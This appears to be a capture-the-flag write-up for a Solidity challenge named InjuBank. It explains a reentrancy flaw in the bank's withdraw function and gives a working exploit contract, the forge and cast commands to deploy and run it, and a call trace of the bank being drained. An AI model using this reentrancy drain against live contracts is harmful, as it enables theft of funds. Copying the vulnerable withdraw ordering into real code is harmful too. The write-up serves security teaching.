This Bank is not as secure as you might think, first let's see what is the `isSolved()` condition on the Setup Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {InjuBank} from "./InjuBank.sol";

contract Setup {
    InjuBank public immutable IB;

    constructor() payable{
        IB = new InjuBank{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(IB).balance == 0;
    }
}
```

based on the Setup Contract, the initial balance of the bank is 50 Ether, while the `isSolved()` will return true if it has 0 balance, not let's see the Inju Bank to see what are we dealing with.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract InjuBank{

    mapping(address => uint256) public balanceOf;

    constructor() payable{}

    function deposit() public payable{
        require(msg.value > 1 ether, "Minimum Deposit is 1 ether");
        uint256 toAdd = msg.value;
        balanceOf[msg.sender] += toAdd;
    }

    function withdraw(uint256 _amount) public{
        require(_amount <= balanceOf[msg.sender], "Amount to Withdraw exceed Balance");
        require(_amount >= 1 ether, "Minimum Withdrawal is 1 Ether");
        uint256 newBalance = balanceOf[msg.sender] - _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Withdrawal Failed!");
        balanceOf[msg.sender] = newBalance;
    }

    receive() external payable { 
        deposit();
    }

}
```

We only have 2 function to deal with in this contract, yeah let's say the `receive()` is the same as the `deposit()`. So first, the `deposit()` function allow us to deposit some Ether to the bank and add it to our account, it has the minimum deposit of 1 Ether. Next up, is the `withdraw()` that allow us to withdraw our money with the minimum amount of 1 Ether per withdrawal, nothing seems strange until we look more closely

```solidity
    function withdraw(uint256 _amount) public{
        // CHECKS 
        require(_amount <= balanceOf[msg.sender], "Amount to Withdraw exceed Balance");
        require(_amount >= 1 ether, "Minimum Withdrawal is 1 Ether");
        uint256 newBalance = balanceOf[msg.sender] - _amount;
        // INTERACTIONS
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Withdrawal Failed!");
        // EFFECT
        balanceOf[msg.sender] = newBalance;
    }
```

The best practice of any function is always CEI or **CHECK** - **EFFECT** - **INTERACTIONS**, the `withdraw()` function however doesn't seem to apply this correctly, instead it implements CIE or **CHECK** - **INTERACTIONS** - **EFFECT**, in this case the **INTERACTIONS** is sending the balance to the `msg.sender`, which if it's a smart contract or more explicitly an Exploit Contract, we can control what to do next after receiving any Ether by modifying the `receive()` function on our Exploit Contract.

The Exploit will have this flow, first we have to deposit some Ether, since the minimum is one an we have 6 Ether, we can give our Exploit 5 Ether and make it deposit all that Ether. Next is calling the withdraw with the value of 5 (our balance), upon receiving the Ether, we can just make it trigger another `withdraw()` of another 5 Ether, this will be repeated until we drain all the balance on the Inju Bank. The Exploit would look like this

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./InjuBank.sol";
import "./Setup.sol";

contract Exploit{
    Setup public immutable setup;
    InjuBank public immutable IB;

    constructor(address payable _setup) payable {
        require(msg.value == 5 ether, "need 5 ether");
        setup = Setup(_setup);
        IB = InjuBank(setup.IB());
    }

    function exploit() public{
        IB.deposit{value: 5 ether}();
        IB.withdraw(5 ether);
    }


    receive() external payable { 
        if(address(IB).balance >= 5 ether){
            IB.withdraw(5 ether);
        }
    }

}
```

To Deploy the Exploit Contract and run it we can use this command

```bash
// Deploying the Exploit Contract
forge create src/inju-bank/$EXPLOIT_FILE:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR --value 5ether

// Calling the exploit
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "exploit()"
```

After running the command, if you press the `Flag` button now you should get the flag. By the way if you are curious on like how the attack worked, here is a little flow of the Exploit.

```bash
├─ [123849] Exploit::attack()
    │   ├─ [22434] InjuBank::deposit{value: 5000000000000000000}()
    │   │   └─ ← ()
    │   ├─ [91371] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   ├─ [83596] Exploit::receive{value: 5000000000000000000}()
    │   │   │   ├─ [83031] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   ├─ [75256] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   ├─ [74691] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   ├─ [66916] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   ├─ [66351] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   ├─ [58576] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   ├─ [58011] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   ├─ [50236] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   ├─ [49671] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [41896] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [41331] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [33556] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [32991] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [25216] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24651] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16876] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16311] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8536] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7971] InjuBank::withdraw(5000000000000000000 [5e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [196] Exploit::receive{value: 5000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   └─ ← ()
    │   │   │   │   └─ ← ()
    │   │   │   └─ ← ()
    │   │   └─ ← ()
    │   └─ ← ()
```

In short, when the Ether is received by our Exploit Contract, it will first check whether the Inju Bank Contract still has balance or not (greater than or equal to 0), if it's valid, it will then call another `withdraw()` with 5 Ether, until it's false.